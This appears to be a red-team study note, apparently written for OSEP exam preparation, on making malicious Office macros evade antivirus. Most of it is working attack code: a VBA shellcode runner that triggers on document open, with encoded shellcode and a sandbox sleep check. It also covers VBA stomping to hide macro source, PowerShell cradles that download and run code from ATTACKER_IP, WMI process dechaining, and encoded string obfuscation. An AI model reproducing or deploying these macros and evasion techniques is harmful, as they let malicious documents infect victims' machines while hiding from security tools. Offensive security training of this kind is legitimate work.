---
title: Bypassing AV in Office
draft: false
tags:
  - red-teaming
  - windows
  - av-evasion
  - vba
  - office
  - evasion
---
 
# Bypassing Antivirus in VBA

1. Create the Helper Project like in C# but using decimal values for the payload instead of hexadecimal for compatibility with VBA and inserting in the payload a new line every 50 characters due to VBA string limitation:
```csharp
using System;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
	        // msfvenom payload
            byte[] buf = new byte[752] {
                0xfc,0x48,0x83,0xe4,0xf0...
            
			// encode the payload using caesar cipher    
            byte[] encoded = new byte[buf.Length];
		    for(int i = 0; i < buf.Length; i++)
		    {
		      encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
		    }
		 
		    uint counter = 0;
		 
		    StringBuilder hex = new StringBuilder(encoded.Length * 2);
		    foreach(byte b in encoded)
		    {
		      hex.AppendFormat("{0:D}, ", b);
		      counter++;
		      // split the encrypted shellcode on multiple lines to handle the maximum size issues of literal strings (inject newline every 50 bytes)
		      if(counter % 50 == 0)
		      {
		        hex.AppendFormat("_{0}", Environment.NewLine);
		      }
		    }
		    Console.WriteLine("The payload is: " + hex.ToString());
		}
	}
}
```

2. Write the custom VBA Macro with the decryption routine and the Sleeper heuristic Bypass:
```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long ' Sleep function

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    Dim t1 As Date
	Dim t2 As Date
	Dim time As Long
    
    ' Check if we are being sandboxed
    t1 = Now()
	Sleep (2000)
	t2 = Now()
	time = DateDiff("s", t1, t2)
	
	If time < 2 Then
	    Exit Function
	End If
    
    buf = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38,
...
224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213)
	
	' Decryption routine
	For i = 0 To UBound(buf)
	    buf(i) = buf(i) - 2
	Next i
	
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub
```

> [!Note]
> The heuristic detection may be flagged so we can try first to remove it and check if it works.

**Alternative Encryption + Heuristic Bypass**

Replace the Caesar cipher (+2 shift) with a multi-byte XOR in the C# Helper and VBA runner:

C# Helper (XOR encode):
```csharp
byte[] key = new byte[] { 0xDE, 0xAD, 0xBE, 0xEF };
byte[] encoded = new byte[buf.Length];
for (int i = 0; i < buf.Length; i++)
    encoded[i] = (byte)(buf[i] ^ key[i % key.Length]);
// Output encoded[] as decimal array for VBA
```

VBA decode routine (replace the Caesar `-2` loop):
```vb
Dim key(3) As Byte
key(0) = &HDE : key(1) = &HAD : key(2) = &HBE : key(3) = &HEF

For i = 0 To UBound(buf)
    buf(i) = buf(i) Xor key(i Mod 4)
Next i
```

Additional heuristic bypasses for VBA:
- **Document name check** — exit if `ActiveDocument.Name` doesn't match the expected lure filename (already shown in Obfuscating VBA section above).
- **Username / domain check** — exit if `Environ("USERDOMAIN")` matches a sandbox value like `SANDBOX`, `CUCKOO`, or `MALWARE`.
- **Screen resolution check** — `Application.ActiveWindow.Width < 100` may indicate a headless sandbox.

> [!Warning]
> OPSEC: VBA that calls `Sleep`, checks time deltas, or reads environment variables can itself be a heuristic signal. Balance the number of checks with evasion effectiveness.

---
# Stomping On Microsoft Word

We are going to investigate how VBA code is stored in Microsoft Word and Excel macros, and how it can be abused to reduce our detection rate agains AV.

> Reference: [_Security research_](https://github.com/clr2of8/Presentations/blob/master/DerbyCon2018-VBAstomp-Final-WalmartRedact.pdf)

The Microsoft Office file formats used in documents with `.doc` and `.xls` extensions rely on the very old and partially-documented proprietary [_Compound File Binary Format_](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cfb/53989ce4-7b05-4f8d-829b-d08d6148375b), which can combine multiple files into a single disk file.

On the other hand, more modern Microsoft Office file extensions, like `.docm` and `.xlsm`, describe an updated and more open file format that is not dissimilar to a .zip file.

> Word and Excel documents using the modern macro-enabled formats can be unzipped with _7zip_ and the contents inspected in a hex editor.

For unwrapping `.doc` files, we will use [_FlexHEX_](https://www.heaventools.com/download-hex-editor.htm) application.

1. Open the Word document:
![[Pasted image 20260707162830.png]]

We can now see all the embedded files and folders included in the document. Any content related to VBA macros are in the **Macros** folder. For Microsoft Word or Excel documents using the newer macro enabled formats, all macro-related information is stored in the **vbaProject.bin** file inside the zipped archive.
![[Pasted image 20260707163030.png]]

**PROJECT File**

The graphical VBA editor determines which macros to show based on the contents of this file. The line `Module=NewMacros` is what the GUI editor uses to link the displayed macros.
![[Pasted image 20260707163253.png]]

To remove this link in the editor and hide our macro from within the graphical Office VBA editor, we can remove the line by replacing it with null bytes. This is done by highlighting the ASCII string and navigating to _Edit_ > _Insert Zero Block_ > OK: 
![[Pasted image 20260707163540.png]]

**VBA_PROJECT and NewMacros Files**

We will be leveraging the [_PerformanceCache_](https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-ovba/ef7087ac-3974-4452-aab2-7dba2214d239), a cached and compiled version of the VBA textual code, known as _P-code_. The P-code is a compiled version of the VBA textual code **for the specific version of Microsoft Office and VBA it was created on**.

If a Microsoft Word document is opened on a different computer that uses the same version and edition of Microsoft Word, the cached pre-compiled P-code is executed, avoiding the translation of the textual VBA code by the VBA interpreter.

If the document is opened on a different version or edition of Microsoft Word, the P-code is ignored, and the textual version of the VBA is used instead.

P-code inside the New-Macros file:
![[Pasted image 20260707164008.png]]

To distinguish the version of the Microsoft Office and VBA the macro was created on, we can view the contents of the **VBA_PROJECT** file. We can see that P-code was compiled for Microsoft Office 16 and VBE7, which is installed in the 32-bit version folder (**C:\Program Files(x86)**):
![[Pasted image 20260707164442.png]]

We can now select in the **NewMacros** file all the bytes starting from "Attribute VB_Name" until the end, and navigate to _Edit_ > _Insert Zero Block_ and accept the size of modifications:
![[Pasted image 20260707164828.png]]

Once the VBA source code has been stomped, we'll save the Microsoft Word document and close FlexHEX to allow it to be re-compressed. We will see that the VBA code has disappeared and if we click "Enable Content" it will execute the Macro (only if the versions match).

TODO: Use the [_Evil Clippy_](https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/) tool (located in C:\Tools\EvilClippy.exe) to automate the VBA Stomping process.

---
# Hiding PowerShell Inside VBA

If we use a typical download cradle, it will be flagged as malicious because the Shell method and the obvious download cradle:
```vb
Sub MyMacro()
  Dim strArg As String
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://ATTACKER_IP/run.txt'))"
  Shell strArg, vbHide
End Sub
```

When the PowerShell process is created directly from the VBA code through _Shell_, it becomes a child process of Microsoft Word. This is suspicious behavior, and we cannot easily obfuscate this VBA function name.

**PS + C# Assembly Download Cradle — Detection Notes**

Instead of `IEX (Download-String ...)` (which is AMSI-scanned), download a pre-compiled `.exe` or `.dll` and load it with `[Reflection.Assembly]::Load()`:

```powershell
$bytes = (New-Object System.Net.WebClient).DownloadData('http://ATTACKER_IP/runner.exe')
[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null, $null)
```

Detection considerations:
- The byte array is not scanned by AMSI on download (only `Invoke-Expression`-style strings are scanned in older PS versions).
- Modern Defender (2023+) does scan `Assembly::Load()` buffers via AMSI's .NET integration — an AMSI bypass must precede this call.
- The compiled assembly itself must be AV-clean (apply [[Signature Based Detection]] techniques to the binary before hosting it).

See also: [[Phishing with Jscript (for emails)]] for the DotNetToJScript equivalent and [[Bypassing AMSI With Reflection in PowerShell]] for the required AMSI bypass.

# Dechaining with WMI

To address the issue of PowerShell being a child process of Word which is suspicious, we will make use of Windows Management Instrumentation (WMI) framework. Our goal is to use WMI from VBA to create a PowerShell process instead of having it as a child process of Microsoft Word.

Steps:
1. Connect to WMI from VBA, which is done through the [_GetObject_](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/getobject-function) method, specifying the [_winmgmts_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/winmgmt) class name (Winmgmt is the WMI service within the SVCHOST process running under the LocalSystem account).
2. Create a PowerShell process using the [_Win32_Process_](https://docs.microsoft.com/en-gb/windows/win32/cimwin32prov/win32-process) class from the [_Win32_](https://docs.microsoft.com/en-gb/windows/win32/cimwin32prov/win32-provider) provider (WMI is divided into [_Providers_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-providers) that contain different functionalities, and each provider contains multiple classes that can be instantiated)
3. Create a new Process using the Get method to select the Win32_Process Class and invoke the Create method.

```vb
Sub MyMacro
  strArg = "powershell"
  'Create args:
  '1: name of the process including its arguments
  '2 and 3: describe process creation information that we do not need
  '4: variable that will contain the process ID of the new process returned by the operating system
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```

> [!Note]
> When performing an action, the Winmgmt WMI service is created in a separate process as a child process of [_Wmiprvse.exe_](https://docs.microsoft.com/en-us/windows/win32/wmisdk/provider-hosting-and-security), which means we can de-chain the PowerShell process from Microsoft Word.

2Download cradle:
```vb
Sub MyMacro
  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://ATTACKER_IP/run.txt'))"
  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    Mymacro
End Sub
```

---
# Obfuscating VBA

We are going to obfuscate our strings in the VBA code using two techniques.

**Reverse String** 

VBA contains a function called [_StrReverse_](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/strreverse-function) that, given an input string, returns a string in which the character order is reversed. 

We can use [_Code Beautify_](https://codebeautify.org/reverse-string) to reverse our strings and insert the _StrReverse_ functions to restore them. We will create a function that calls _StrReverse_ to minimize its use in the code since its widely used in malware:
```vb
Function bears(cows)
    bears = StrReverse(cows)
End Function

Sub Mymacro()
Dim strArg As String
strArg = bears("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")

GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```

The **problem** of this technique is that we have introduced a new potential flag with _StrReverse_ in our code.

**Manual Encode (undetectable)**

To reduce the detection rate even further, we can perform a more complex obfuscation by converting the ASCII string to its decimal representation and then performing a Caesar cipher encryption on the result.

- Encryption script:
```powershell
# usage: encode.ps1 "string"
# key = 17
$payload = $args[0]

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar # padding of 2 char
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar # padding of 1 char
        $output += $thischar
    }
    elseif($thischar.Length -eq 3) # no padding needed
    {
        $output += $thischar
    }
}
$output | clip
```

> [!Note]
> Output is placed on the clipboard

2. Place it on the VBA script each string.

3. Decryption VBA script. It uses normal names, has a decryption routine for the strings, it runs as a child process with a parent different than word, and bypasses heuristics by checking the document name when the macro runs.
```vb
' subtracts the Caesar cipher value, and then converts it to a character that is added to the accumulator in Oatmilk
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

' extract 3 first characters from the payload and returns that value
Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

' exclude the decrypted characters per iteration
Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk)) ' decrypt the first 3 characters and append it to the solution
    Milk = Almonds(Milk) 'exclude the decrypted characters
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function

Function MyMacro()
    Dim Apples As String
    Dim Water As String
    
    ' heuristics bypass: if the document name is different than the current name, we exit the function (encode the current doc name, for example runner.doc)
    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
	  Exit Function
	End If
    
    ' Place the encoded download cradle string here (powershell -ep bypass...)
    Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066066074063066067065064115128128124063133137133056058058"
    Water = Nuts(Apples)
    
	' Place the encoded WMI strings here
	GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function
```

> [!Important]
> The techniques we have employed are not only usable for the initial shellcode runner payload, but also for any exploit or tool that must be written to the target's filesystem.

**Combined: AES Encryption + Emulator Detection in Obfuscated VBA**

Combine AES-encrypted strings with an emulator sandbox check to minimise detection:

1. AES-encrypt each string (download cradle, WMI class names) offline using a PowerShell or C# helper.
2. In the VBA macro, decrypt the strings at runtime using the VBA `CryptDecrypt` wrapper or a pure-VBA AES implementation.
3. Add the document-name heuristic bypass (already shown above) and optionally a `Sleep` timer check.

For the emulator check, use the `DateDiff` sleep technique from the Bypassing Antivirus in VBA section above — emulators fast-forward through `Sleep`, while real systems wait.

> [!Note]
> Pure-VBA AES is verbose (~150 lines) but produces no disk artifacts beyond the document itself, making it highly evasion-effective. A shorter alternative is XOR with a runtime-derived key (e.g., `Environ("COMPUTERNAME")` XOR'd byte-by-byte as the key seed).

**Lab Exercise — Serviio PRO 1.8 DLNA Exploit**

> [!Important] Course Lab Exercise
> This is an OSEP exam-prep lab exercise. The goal is to:
> 1. Enumerate the Serviio PRO 1.8 service on the target (default port 23423/TCP for the management API).
> 2. Identify the relevant CVE / public exploit (Serviio PRO 1.8 has a known unauth RCE via the DLNA API endpoint).
> 3. Weaponise the exploit so the payload evades Avira real-time detection — apply the techniques from [[Signature Based Detection]], [[Behavior-Heuristic Based Detection]], and [[Bypassing AV in Office]].
> 4. Obtain a SYSTEM-level shell.
>
> Hint: chain the AES/XOR shellcode runner (above) with the sleep-timer sandbox check and use a staged payload (download cradle) to minimise the on-disk footprint.

Extra Mile:
TODO: **Process Hollowing + AV Bypass (Extra Mile)**

Apply the full evasion stack to the process hollowing C# code from [[Process Injection and Migration]]:

1. **Encrypt the shellcode** — use the XOR or AES routine from the *Bypassing Antivirus with C#* section above. Replace the raw `buf[]` array with the encrypted version and add the decryption loop before allocation.
2. **Add the sandbox detection checks** — sleep timer (`DateTime.Now` delta) and `VirtualAllocExNuma` / `FlsAlloc` non-emulated API checks from [[Behavior-Heuristic Based Detection]].
3. **Obfuscate string literals** — any hardcoded strings (`svchost.exe`, API names) that are passed to `CreateProcess` should be XOR-encoded and decoded at runtime to avoid static string signatures.
4. **RWX → RW+RX transition** — create the hollow section with `PAGE_READWRITE`, write shellcode, then call `VirtualProtectEx` to change to `PAGE_EXECUTE_READ` before resuming the thread. Avoids the RWX memory signature that Defender flags.

> [!Warning]
> OPSEC: `CreateProcess` with `CREATE_SUSPENDED` followed by `WriteProcessMemory` and `SetThreadContext` is a well-known sequence. Modern EDR products (CrowdStrike, SentinelOne) detect this via kernel callbacks regardless of AV evasion. For a lower-footprint alternative, see the NtCreateSection shared-memory injection technique in [[Process Injection and Migration]].


---
# Related Notes

- [[Antivirus Evasion]] — overview
- [[Signature Based Detection]] — static byte evasion
- [[Behavior-Heuristic Based Detection]] — heuristic/sandbox evasion
- [[Phishing with Microsoft Office]] — VBA macro delivery
- [[Process Injection and Migration]] — process hollowing + injection
- [[Bypassing AMSI With Reflection in PowerShell]] — AMSI bypass for PS runners
